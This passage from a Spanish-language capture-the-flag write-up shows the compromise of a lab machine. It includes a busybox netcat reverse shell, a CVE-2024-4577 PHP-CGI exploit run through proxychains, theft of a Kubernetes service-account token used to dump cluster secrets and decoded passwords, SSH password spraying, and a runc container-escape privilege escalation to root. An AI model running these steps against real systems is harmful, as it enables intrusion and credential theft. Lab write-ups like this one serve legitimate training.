‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
[-] Spawn MANUALLY a new shell for this session to operate properly
/var/www/html/cgi-bin # 
```
* Tenemos acceso como root a este host:
```bash
/var/www/html/cgi-bin # ps aux | grep root 
    1 root      0:00 {start.sh} /bin/sh /start.sh
    9 root      0:00 /usr/local/bin/php-cgi
   12 root      0:00 nginx: master process nginx -g daemon off;
   14 root      0:00 sh -c echo `busybox nc 10.10.15.196 12345 -e sh`;
   15 root      0:00 sh
   44 root      0:00 sh
   47 root      0:00 cat /tmp/_
   48 root      0:00 sh
   49 root      0:00 nc 10.10.15.196 12345
   77 root      0:00 /usr/bin/script -q /dev/null
   78 root      0:00 sh -i
   90 root      0:00 ps aux
   91 root      0:00 grep root
/var/www/html/cgi-bin # ls -la
total 12
drwxr-xr-x    1 root     root          4096 Jul 29 03:08 .
drwxrwxrwt    1 www-data www-data      4096 Jul 29 03:08 ..
-rwxr-xr-x    1 root     root           879 Jul 26 21:53 php-cgi
/var/www/html/cgi-bin # cd /
/ # ls -la
total 72
drwxr-xr-x    1 root     root          4096 Nov  7 20:21 .
drwxr-xr-x    1 root     root          4096 Nov  7 20:21 ..
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 bin
drwxr-xr-x    5 root     root           360 Nov  7 20:21 dev
drwxr-xr-x    1 root     root          4096 Nov  7 20:21 etc
drwxr-xr-x    1 root     root          4096 Jan 27  2024 home
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 lib
drwxr-xr-x    5 root     root          4096 Jan 26  2024 media
drwxr-xr-x    2 root     root          4096 Jan 26  2024 mnt
drwxr-xr-x    2 root     root          4096 Jan 26  2024 opt
dr-xr-xr-x  557 root     root             0 Nov  7 20:21 proc
drwx------    1 root     root          4096 Nov  7 20:23 root
drwxr-xr-x    1 root     root          4096 Nov  7 20:21 run
drwxr-xr-x    1 root     root          4096 Jul 26 22:09 sbin
drwxr-xr-x    2 root     root          4096 Jan 26  2024 srv
-rwxr-x--x    1 root     root           311 Jul 24 01:52 start.sh
dr-xr-xr-x   13 root     root             0 Nov  7 13:35 sys
drwxrwxrwt    1 root     root          4096 Nov  7 20:22 tmp
drwxr-xr-x    1 root     root          4096 Feb 16  2024 usr
drwxr-xr-x    1 root     root          4096 Jan 27  2024 var
/ # cat start.sh
#!/bin/sh
echo "üöÄ Starting REAL php-cgi..."

mkdir -p /var/run
spawn-fcgi -s /var/run/php-cgi.socket -U nginx -G nginx \
          -- /usr/local/bin/php-cgi
chmod 666 /var/run/php-cgi.socket
echo "‚úÖ php-cgi.socket ready"
ls -la /var/run/php-cgi.socket

echo "üåê Starting nginx..."
nginx -g "daemon off;"
```
[Exploit - 2](https://github.com/toshithh/Ice-Tools/blob/main/CVE-2024-4577.py)

Mismo resultado que el anterior pero **mas estable** sin listener con proxychains

**/run/secrets/kubernetes.io/serviceaccount/token**

```bash
proxychains python3 CVE-2024-4577.py --target http://10.43.2.241:5000/cgi-bin/php-cgi
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
cmd: whoami
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
root
IceMaster - Rocks
[END]
cmd: id
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
IceMaster - Rocks
[END]
cmd: ls                                                                      
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
php-cgi
IceMaster - Rocks
[END]
cmd: ls /
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
bin dev etc home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var
IceMaster - Rocks
[END]
cmd: ls /run
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
nginx nginx.pid php-cgi.socket secrets
IceMaster - Rocks
[END]
cmd: ls /run/secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
kubernetes.io
IceMaster - Rocks
[END]
cmd: ls /run/secrets/kubernetes.io
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
serviceaccount
IceMaster - Rocks
[END]
cmd: ls /run/secrets/kubernetes.io/serviceaccount
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
ca.crt namespace token
IceMaster - Rocks
[END]
cmd: cat /run/secrets/kubernetes.io/serviceaccount/token
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.43.2.241:5000  ...  OK
[START]
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0MTA5MTQ1LCJpYXQiOjE3NjI1NzMxNDUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDc4M2ZlM2YtMTVjZi00ODRhLWJmMWMtYmNmNzEyZDMyOWE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjU3Njc1Mn0sIm5iZiI6MTc2MjU3MzE0NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.fl1oVYNH7VvHHc00jqJPnxGoFpDH9OunBkX5VI0QdvGPSEWV8ElDPkie8SqkxniDq0nwnBU9y_0Ot-8bGQd6eT_k-5BHR6P88A73NIPPVTWSVJnhueh1WNdWADQDtPYEJbVATxZ0GcK3F4CJ7O8uKvUVgCppcTp7heuASxXvthg6XOZ7ep72vd_oL_h419PFhfEX_XvA_t3Kys7jYZxXo73-5jy0_cYJpOhv8ZuMpOU2eSYIBJ2U7b8XHcwmZrszVd6Y6-I1xFAh6xCn7T7CJ_dsp5fVvy5eaPpS8RKlT7YwC66OWiM-EXuGek1PV0_9C4y1C1pYgXtvZTC4qE7KaA
IceMaster - Rocks
[END]
cmd: 
```
Armamos un request
```bash
proxychains curl -sSk --header "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzk0MTA5MTQ1LCJpYXQiOjE3NjI1NzMxNDUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNDc4M2ZlM2YtMTVjZi00ODRhLWJmMWMtYmNmNzEyZDMyOWE0Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWptNmJ6IiwidWlkIjoiYjg0NGI4MDctMGIyMS00NWQ1LWJhNmYtODIxZmM1ZTFlN2RkIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2MjU3Njc1Mn0sIm5iZiI6MTc2MjU3MzE0NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.fl1oVYNH7VvHHc00jqJPnxGoFpDH9OunBkX5VI0QdvGPSEWV8ElDPkie8SqkxniDq0nwnBU9y_0Ot-8bGQd6eT_k-5BHR6P88A73NIPPVTWSVJnhueh1WNdWADQDtPYEJbVATxZ0GcK3F4CJ7O8uKvUVgCppcTp7heuASxXvthg6XOZ7ep72vd_oL_h419PFhfEX_XvA_t3Kys7jYZxXo73-5jy0_cYJpOhv8ZuMpOU2eSYIBJ2U7b8XHcwmZrszVd6Y6-I1xFAh6xCn7T7CJ_dsp5fVvy5eaPpS8RKlT7YwC66OWiM-EXuGek1PV0_9C4y1C1pYgXtvZTC4qE7KaA" --cacert "/run/secrets/kubernetes.io/serviceaccount/ca.crt" "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"
```
de aqui obtenemos un json con lo siguiente:

| Secret Name                   | Campo                   | Valor (Base64 original)                        | Contrase√±a decodificada            |
| ----------------------------- | ----------------------- | ---------------------------------------------- | ---------------------------------- |
| **beta-vino-wp-mariadb**      | `mariadb-password`      | `c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T`             | `sss0spa3u7RLyetrekE4oS`           |
| **beta-vino-wp-mariadb**      | `mariadb-root-password` | `c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==`         | `sss0syetre32828383kE4oS`          |
| **beta-vino-wp-wordpress**    | `wordpress-password`    | `TzhGN0tSNXpHaQ==`                             | `O8F7KR5zGi`                       |
| **user-secret-babywyrm**      | `MASTERPASS`            | `Nmp1V1BjNFZscGh3UFZuM2NkZEI4SWw3bVZ2QkI=`     | `6juWPc4VlphwPVn3cddB8Il7mVvBB`    |
| **user-secret-margotrobbie**  | `USER_PASSWORD`         | `eUVISWRwOWQwNXhsMHAyRzRmT25RanczY2wzRjh3TQ==` | `yEHIdp9d05xl0p2G4fOnQjw3cl3F8wM` |
| **user-secret-sydneysweeney** | `USER_PASSWORD`         | `QU1ZamFYYnFwdTcwd0t0M1NLSFR0MmxkdHBNbnk=`     | `AMYjaXbqpu7wKt3SKHTt2ldtpMny`     |

cWMxRTVDZzNTZGx1b0xCU29NSEg5aXFNcFlKZFA= | qc1E5Cg3SdluoLBSoMHH9iqMpYJdP
c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
**Propagamos**

```bash
nxc ssh 10.10.11.94 -u users.txt -p passwords.txt  --continue-on-success
```
```bash
ssh babywyrm@10.10.11.94
babywyrm@10.10.11.94's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Nov 9 04:57:52 2025 from 10.10.15.196
babywyrm@giveback:~$ ls -la
total 40
drwxr-x--- 5 babywyrm babywyrm 4096 Oct  2 20:28 .
drwxr-xr-x 3 root     root     4096 Sep 21  2024 ..
lrwxrwxrwx 1 root     root        9 Oct  2 20:28 .bash_history -> /dev/null
-rw-r--r-- 1 babywyrm babywyrm  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 babywyrm babywyrm 3919 Oct 26  2024 .bashrc
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .cache
drwx------ 4 babywyrm babywyrm 4096 Sep 21  2024 .config
-rw-r--r-- 1 babywyrm babywyrm  807 Jan  6  2022 .profile
drwx------ 2 babywyrm babywyrm 4096 Sep 21  2024 .ssh
-rw-r--r-- 1 babywyrm babywyrm    0 Sep 21  2024 .sudo_as_admin_successful
-rw-r--r-- 1 babywyrm babywyrm   45 Oct 16  2024 .wgetrc
-rw-r----- 1 root     babywyrm   33 Nov  9 03:11 user.txt
babywyrm@giveback:~$ cat user.txt
8360d8087674a0a9edec0af28948bb8b
```

#### Paso 3: Privilege Escalation

```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

```bash
babywyrm@giveback:~$ sudo -S /opt/debug
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
NAME:
   runc - Open Container Initiative runtime

runc is a command line client for running applications packaged according to
the Open Container Initiative (OCI) format and is a compliant implementation of the
Open Container Initiative specification.

runc integrates well with existing process supervisors to provide a production
container runtime environment for applications. It can be used with your
existing process monitoring tools and the container will be spawned as a
direct child of the process supervisor.

Containers are configured using bundles. A bundle for a container is a directory
that includes a specification file named "config.json" and a root filesystem.
The root filesystem contains the contents of the container.

To start a new instance of a container:

    # runc run [ -b bundle ] <container-id>

Where "<container-id>" is your name for the instance of the container that you
are starting. The name you provide for the container instance must be unique on
your host. Providing the bundle directory using "-b" is optional. The default
value for "bundle" is the current directory.

USAGE:
   runc.amd64.debug [global options] command [command options] [arguments...]

VERSION:
   1.1.11
commit: v1.1.11-0-g4bccb38c
spec: 1.0.2-dev
go: go1.20.12
libseccomp: 2.5.4

COMMANDS:
   checkpoint  checkpoint a running container
   create      create a container
   delete      delete any resources held by the container often used with detached container
   events      display container events such as OOM notifications, cpu, memory, and IO usage statistics
   exec        execute new process inside the container
   kill        kill sends the specified signal (default: SIGTERM) to the container's init process
   list        lists containers started by runc with the given root
   pause       pause suspends all processes inside the container
   ps          ps displays the processes running inside a container
   restore     restore a container from a previous checkpoint
   resume      resumes all processes that have been previously paused
   run         create and run a container
   spec        create a new specification file
   start       executes the user defined process in a created container
   state       output the state of a container
   update      update container resource constraints
   features    show the enabled features
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug             enable debug logging
   --log value         set the log file to write runc logs to (default is '/dev/stderr')
   --log-format value  set the log format ('text' (default), or 'json') (default: "text")
   --root value        root directory for storage of container state (this should be located in tmpfs) (default: "/run/runc")
   --criu value        path to the criu binary used for checkpoint and restore (default: "criu")
   --systemd-cgroup    enable systemd cgroup support, expects cgroupsPath to be of form "slice:prefix:name" for e.g. "system.slice:runc:434234"
   --rootless value    ignore cgroup permission errors ('true', 'false', or 'auto') (default: "auto")
   --help, -h          show help
   --version, -v       print the version
```

[Fuente - 1](https://www.paloaltonetworks.com/blog/cloud-security/leaky-vessels-vulnerabilities-container-escape/)
[Fuente - 2](https://www.cve.news/cve-2024-21626/)

Generamos

```bash
babywyrm@giveback:~$ mkdir -p /tmp/runc/rootfs
babywyrm@giveback:/tmp/runc$ wget http://10.10.15.196:8000/config.json
--2025-11-09 06:09:55--  http://10.10.15.196:8000/config.json
Connecting to 10.10.15.196:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1111 (1.1K) [application/json]
Saving to: ‚Äòconfig.json‚Äô

config.json                                                100%[========================================================================================================================================>]   1.08K  --.-KB/s    in 0s      

2025-11-09 06:09:56 (69.3 MB/s) - ‚Äòconfig.json‚Äô saved [1111/1111]

babywyrm@giveback:/tmp/runc$ sudo /opt/debug run -b /tmp/runc readflag
[sudo] password for babywyrm: 
Validating sudo...
Please enter the administrative password: 

Both passwords verified. Executing the command...
14b575507913f08b65cd882c2f334006
babywyrm@giveback:/tmp/runc$ 
```